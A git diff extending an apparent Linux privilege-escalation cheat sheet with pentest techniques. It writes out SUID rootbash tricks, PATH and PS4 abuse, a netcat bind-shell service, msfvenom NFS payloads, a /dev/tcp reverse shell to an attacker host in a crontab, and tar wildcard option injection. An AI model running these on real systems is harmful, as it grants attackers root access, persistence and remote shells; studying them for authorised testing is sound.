@@ -16,7 +16,18 @@ Look for the sudo rights, maybe a command can be abused : `sudo -l`
 
 ### Detect environment
 
+There are 3 great script to automate privesc enumerations (test in this order):
+
+* [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+* [linux smart enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
+* [LinEnum](https://github.com/rebootuser/LinEnum)
+
 Search for a `/.dockerenv` file to know if you are in a container.
+
+### Kernel Exploits
+
+Use [linux exploit suggester script](https://github.com/jondonas/linux-exploit-suggester-2) which proposes kernel exploit to privesc.
+WARNING: this should be a last resort, they often are very unstable.
 
 ### SUID
 
@@ -45,6 +56,34 @@ find \                # lister tout les fichiers
 
 Once you have this binary list, you can search for a way to escalate privileges from [GTFOBins](https://gtfobins.github.io/) website.
 
+#### Shell abuse
+
+Execute `strings` on the binary
+
+If you find a shell command (without absolute path), see if PATH can be abused.
+
+```bash
+cat > mycommand <<EOF
+> #!/bin/bash
+> cp /bin/bash /tmp/rootbash
+> chmod +xs /tmp/rootbash
+> EOF
+```
+
+If no, you can overrite a full path using a bash function (bash version lower than 4.2)
+
+```bash
+function /usr/sbin/mycommand { /bin/bash -p; }
+export -f /usr/sbin/mycommand
+```
+
+When in debugging mode, Bash lower than 4.4 uses the environment variable PS4 to display an extra prompt for debugging statements.
+This can be exploited.
+
+```bash
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /my/suid/commmand
+```
+
 ### Systemctl
 
 If netcat is available and the `systemctl` command can be abused (see [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/)), the following service can be installed to elevate privileges and, even, as a way to create persistance.
@@ -56,6 +95,36 @@ ExecStart=/bin/sh -c "nc -lp 5555 -e /bin/bash"
 [Install]
 WantedBy=multi-user.target
 ```
+
+### NFS root squashing
+
+On the target, look for nfs exports
+
+```bash
+cat /etc/exports
+```
+
+Find the nfs version using rpcinfo
+
+```bash
+rpcinfo $TARGET_IP |egrep "service|nfs"
+```
+
+On attacker machine, mount the nfs volume
+
+```bash
+mkdir $NFS_MOUNTPOINT
+sudo mount.nfs -o nolock,rw,vers=$NFS_VERSION $TARGET_IP:$TARGET_EXPORT $NFS_MOUNTPOINT
+```
+
+Generate a simple exploit as root and make it SUID
+
+```bash
+sudo msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o $NFS_MOUNTPOINT/shell.elf
+sudo chmod +xs $NFS_MOUNTPOINT/shell.elf
+```
+
+On the target, execute the malicious binary
 
 ### Mysql UDF
 
@@ -226,7 +295,9 @@ Then run the program with your malicious library
 sudo LD_LIBRARY_PATH=/tmp/libs/$TARGETLIB $SUDOABLEPROGRAM
 ```
 
-### Writable crontab script
+### Crontabs
+
+#### Writable script
 
 If you are able to overwrite a script run by crontab as root.
 
@@ -234,6 +305,39 @@ You can use a common payload
 
 ```bash
 echo "bash -i >& /dev/tcp/$PIRATEIP/$PIRATEPORT 0>&1" > $VULNERABLESCRIPT
+```
+
+#### Permissive PATH
+
+The PATH used by cron jobs may be modified in `/etc/crontab`.
+
+If
+
+* a cron is running as root
+* it's using this path to discovert an executable position
+* the PATH contain a writable directory
+
+We can abuse the path to create a malicious binary in a valid PATH directory.
+
+#### Abusing wildcard
+
+The following command
+
+```bash
+tar czf /tmp/backup.tar.gz *
+```
+
+Can be exploited by creating 2 files
+
+```bash
+touch ./--checkpoint=1
+touch ./--checkpoint-action=exec=shell.elf
+```
+
+The command that will be run:
+
+```bash
+tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=shell.elf
 ```
 
 
